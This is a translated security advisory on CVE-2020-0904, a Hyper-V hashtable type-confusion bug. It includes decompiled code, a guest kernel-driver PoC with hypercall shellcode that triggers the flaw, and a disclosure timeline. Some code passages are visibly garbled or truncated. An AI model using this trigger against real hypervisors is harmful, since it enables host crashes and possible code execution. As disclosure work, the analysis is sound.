# CVE-2020-0904：Hyper-V类型混淆任意地址解引用漏洞分析
|
##### 译文声明
本文是翻译文章，文章原作者 Daniel Fernandez Kuehr，文章来源：labs.bluefrostsecurity.de
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 影响平台
Windows 10.0.18363.418  
Hyper-V内核版本18362 x64  
早期版本也受影响。
## 0x01 技术细节
Hyper-V的一些hypervisor组件中使用了一个哈希表的实现，通过在结构体的定义中嵌入一个`entry`字段，可以把对象链接起来，类似链表的`LIST_ENTRY`的用法。
entry的结构可定义如下：
    struct entry
    {
      struct entry *next;
      unsigned long key;
    };
包含`entry`字段的哈希表对象的`key`对应的值被初始化为-1，这一项用作遍历表时的结束标志。如果攻击者搜索值-1，查找函数的一个漏洞将导致调用者认为搜索成功，且查找函数会返回这个末尾表项。调用者会认为这是表中的普通有效表项，接着去使用它。
哈希表对象的结构体中的部分字段如下：
  * 桶的数量
  * 元素的数量
  * 指向桶（至多30个）的指针数组
  * 末尾表项`entry`，其`key=-1`且`next=NULL`
  * 指向表头的指针（初始化为末尾表项）
我们关心的字段是哈希表结构中内嵌的末尾表项和表头，从表头出发可以得到表中所有元素。表头初始化为指向末尾表项。
所有元素链接在一起，按key升序排列。桶用来索引表项，以便加速查找时间。
当插入元素或者查找key时，原始key进行如下变换：
    key = reverse_bits64(key) | 1
key的最高位丢失了，导致可能出现key碰撞：`k' = k ^ (1 >> def keys(bucket_count):
    ...   return [list(range((1 >> keys(4)
    [[0, 1], [2, 3], [4, 5, 6, 7], [8, 9, 10, 11, 12, 13, 14, 15]]
这些keys也进行位反转，但不和1进行或操作，保证其在查找时不会和通常的元素keys匹配。
最后是遍历函数，在元素放入表中某部位（由桶索引）后调用遍历函数。此时必须遍历元素来寻找匹配的key。
    bool __fastcall fun_traversal(struct entry *list_head, unsigned __int64 key,
     volatile signed __int64 **pPrevious, volatile signed __int64 **pCurrent)
    {
      struct entry *head; // rbx
      struct entry *previous; // r10
      struct entry *current; // rax
      struct entry *_next; // rcx
      struct entry *next; // rcx
      head = list_head;
    LABEL_2:
      previous = head;
      for ( current = (head->next & 0xFFFFFFFFFFFFFFFEui64); ; current = next )
      {
        _next = current->next;
        *pPrevious = previous;
        *pCurrent = current;
        if ( !(_next & 1) )
          break;
        next = (_next & 0xFFFFFFFFFFFFFFFEui64);
        if ( current != _InterlockedCompareExchange(previous, next, current) )
          goto LABEL_2;
    LABEL_7:
        ;
      }
      if ( *&current->key key == key;
    }
该函数遍历给定的表，从`head`开始，直到找到大于等于`key`参数的key。参数`pPrevious`和`pCurrent`被设为最后访问的表项的地址。如果找到了key，返回`true`，否则返回`false`。
进行查找的代码会期望遍历函数在key未找到时返回`false`，但是如果我们查找的是末尾表项的key（-1）的话，因为-1的二进制位全为1，所以与1或的操作无法保护它，函数将会返回`true`，而`pCurrent`则指向末尾表项。
只需搜索key`0xffffffffffffffff`就可以触发这个问题，碰撞的key`0x7fffffffffffffff`也会产生此行为。
如上所述，返回的表项类似于`LIST_ENTRY`字段，所以要计算所对应的对象的基地址，就需要减去字段的偏移：
    CONTAINING_RECORD(resulting_base, struct obj_type, entry_field)
因为返回的地址是末尾表项的地址，对其应用`CONTAINING_RECORD`将会返回哈希表对象内部（或其下方）的任意地址。调用者会认为这是所期望的对象类型，而接着对这个任意指针进行操作。
## 0x02 影响
该漏洞的影响范围取决于影响着最终的偏移地址的一些条件，漏洞可以潜在导致任意代码执行。
这些条件例如：
  * 调用者的对象大小和entry字段的偏移
  * 发行版/平台间结构体布局的差异
## 0x03 PoC
以下PoC可触发漏洞，使用了`HvFlushGuestPhysicalAddressSpace` hypercall，我们认为这是最简单的触发路径。
需要在Windows客户机中加载驱动，且客户机开启嵌套虚拟化，禁用Hyper-V。
主机运行：
    Set-VMProcessor -VMName poc_vm -ExposeVirtualizationExtensions $true
客户机运行（需要重启）：
    bcdedit /set hypervisorlaunchtype off
    #include 
    #include 
    #include 
    #include 
    #include 
    EXTERN_C_START
    DRIVER_INITIALIZE DriverEntry;
    EXTERN_C_END
    #ifdef ALLOC_PRAGMA
    #pragma alloc_text (INIT, DriverEntry)
    #endif
    #pragma code_seg(push, r1, ".text")
    __declspec(allocate(".text")) BYTE trigger[] =
    {
        0x48, 0x89, 0xC8,             //  mov rax, rcx               hypercall page
        0xB9, 0xAF, 0x00, 0x01, 0x00, //  mov ecx, 0x100af
        0x48, 0xBA, 0xFF, 0xFF, 0xFF, //           HvFlushGuestPhysicalAddressSpace
        0xFF, 0xFF, 0xFF, 0xFF, 0x7F, //  mov rdx,0x7fffffffffffffff            GPA
        0x4D, 0x31, 0xC0,             //  xor r8,r8                           flags
        0xFF, 0xD0                    //  call rax
    };
    #pragma code_seg(pop, r1)
    typedef void(* TriggerCall)(void *hc_page);
    typedef union hv_x64_msr_contents
    {
        UINT64 as_uint64;
        struct
        {
            UINT64 enable : 1;
            UINT64 reserved : 11;
            UINT64 guest_physical_address : 52;
        } u;
    } hv_msr_contents;
    #define HV_X64_MSR_GUEST_OS_ID              0x40000000
    #define HV_X64_MSR_HYPERCALL                0x40000001
    #define HV_X64_MSR_VP_ASSIST_PAGE                0x40000073
    #define CR4_VMXE (1  r rcx
    rcx=0000000000000010
    3: kd> kb
     # RetAddr           : Args to
    Child                                                           : Call Site
    00 fffffbf3`a0904cce : ffffe802`c5604190 ffffe802`c56048c0
    00000000`00000003 ffffe802`c5608050 : hv+0x30548c
    01 fffffbf3`a09026f3 : ffffe802`c5604050 fffffbf3`a1201068
    00000000`00000001 fffffbf3`a090f7e9 : hv+0x304cce
    02 fffffbf3`a08b6363 : 00000000`00000010 ffff9d86`d2a8f7b8
    00000000`00000000 00000000`00000000 : hv+0x3026f3
    03 fffffbf3`a0829068 : 00000000`00000000 00000000`00000002
    00000000`00000000 fffffbf3`a082ea1e : hv+0x2b6363
    04 fffffbf3`a0828cf2 : 00000000`00000000 fffffbf3`a08255c1
    ffffe802`c5608050 fffffbf3`a081d842 : hv+0x229068
    05 fffffbf3`a081e1de : 00000000`00000000 00000000`0010003a
    00000000`0010003a 00000000`000100af : hv+0x228cf2
    06 fffffbf3`a08734f6 : 00000000`00000000 ffffe802`c5608000
    00000000`800000ff 00000000`00000001 : hv+0x21e1de
    07 00000000`00000000 : 00000000`00000000 00000000`00000000
    00000000`00000000 00000000`00000000 : hv+0x2734f6
## 0x04 时间线
2020-06-02：漏洞报告发送至[PI:EMAIL](mailto:PI:EMAIL)  
2020-07-21：微软确认奖金15000美元  
2020-09-08：微软发布补丁